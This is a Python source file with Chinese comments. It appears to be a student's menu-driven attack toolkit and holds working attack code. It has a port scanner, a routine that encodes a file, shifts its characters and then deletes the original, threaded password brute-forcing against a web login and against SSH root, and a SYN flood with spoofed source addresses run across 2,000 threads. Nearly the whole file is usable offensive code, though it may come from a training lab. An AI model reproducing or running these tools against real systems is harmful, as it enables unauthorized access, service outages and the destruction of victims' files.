import base64, os,socket, threading, time,requests
import random, threading
from scapy.all import *
from scapy.layers.inet import IP, TCP


#端口扫描
def socket_port_normal(ip):
    list = [7, 21, 22, 23, 25, 43, 53, 67, 68, 69, 79, 80, 81, 88, 109, 110, 113, 119, 123, 135, 135,
         137, 138, 139, 143, 161, 162, 179, 194, 220, 389, 443, 445, 465, 513, 520, 520, 546, 547,
         554, 563, 631, 636, 991, 993, 995, 1080, 1194, 1433, 1434, 1494, 1521, 1701, 1723, 1755,
         1812, 1813, 1863, 3269, 3306, 3307, 3389, 3544, 4369, 5060, 5061, 5355, 5432, 5671, 5672, 6379,
         7001, 8080, 8081, 8088, 8443, 8883, 8888, 9443, 9988, 9988, 15672, 50389, 50636, 61613, 61614]
    for port in list:
        try:
            s = socket.socket()
            s.settimeout(1)       # 设置无法连接情况下超时时间，提升扫描效率
            s.connect((ip, port))
            print(f"端口：{port} 可用.")
            s.close()
        except:
            pass
        time.sleep(1)


# 针对某个文件进行Base64转码并加密保存
def encrypt(filepath):
    with open(filepath, mode='rb') as file:
        data = file.read()
    source = base64.b64encode(data).decode()
    # 加密算法：大小写字母右移5位
    dest = ''
    for c in source:
        dest += chr(ord(c)+5)
    # 将加密字符串保存到文件中
    with open(filepath + '.enc', mode='w') as file:
        file.write(dest)
    # 删除原始文件
    os.remove(filepath)


#找到80端口，爆破sales的密码
def ws_thread_10(sublist):
    with open('/top6000.txt.txt') as file:
        pw_list = file.readlines()
    print("只针对sales")
    url1 = input("请输入要爆破的url：")
    url = url1
    for username in sublist:
        for password in pw_list:
            data = {'username': username.strip(), 'password': password.strip(), 'verifycode':'0000'}
            resp = requests.post(url=url, data=data)
            if 'login-fail' not in resp.text:
                print(f'疑似破解成功, 账号为：{username.strip()}，密码为：{password.strip()}')
                exit()
#找到ssh22号端口爆破
def ssh_crack(ip):
    import paramiko
    with open('./top500.txt') as file:
        pw_list = file.readlines()
    for password in pw_list:
        try:
            transport = paramiko.Transport((ip, 22))
            transport.connect(username='root', password=password.strip())
            print(f"登录成功，密码为：{password.strip()}")
            exit()
        except:
            pass
        time.sleep(2)

#syn泛洪攻击
# 模拟半连接，SYN泛洪
def synFlood(tgt,dPort):
    srclist = ['33.56.32.1','128.33.69.52','211.2.32.23','221.43.39.137']
    for sPort in range(1000,20000):
        index = random.randint(0,3)
        ipLayer = IP(src = srclist[index],dst = tgt)
        tcoLayer = TCP(sport = sPort, dport = dPort, flags = 'S')
        packet1 = ipLayer/tcoLayer
        print(packet1)
        send(packet1)
#界面
def title():
    print("+*****************")
    print("+作者:swing，专利所有，禁止侵权")
    print("当前时间", time.asctime( time.localtime(time.time()) ))
    print("使用方法：按照提示输入")
    print("+*****************")
def atack():
    choose = int(input("选择服务：\n1、端口扫描\n2、加密文件（base64加密）\n3、爆破woniusales\n4、爆破ssh\n5.syn泛洪攻击(针对80端口）\n6.返回界面\n7.退出\n请输入："))
    if choose==1:
        ip = input("请输入要端口扫描的ip：")
        socket_port_normal(ip)
    elif choose==2:
        file_pa= input("请输入路径：")
        encrypt(file_pa)
    elif choose==3:
        # 爆破sales
        with open('./top500.txt') as file:
            user_list = file.readlines()
        for i in range(0, len(user_list), 10):
            sublist = user_list[i:i + 10]
            threading.Thread(target=ws_thread_10, args=(sublist,)).start()
    elif choose==4:
        #爆破22ssh端口
        ip = input("请输入要爆破的ip：")
        ssh_crack(ip)
    elif choose==5:
        ip = input("请输入要泛洪的ip：")
        for i in range(2000):
            threading.Thread(target=synFlood, args=(ip, 80)).start()
    elif choose == 6:
        atack()
    else:
        exit()



if __name__ == '__main__':
    title()
    atack()
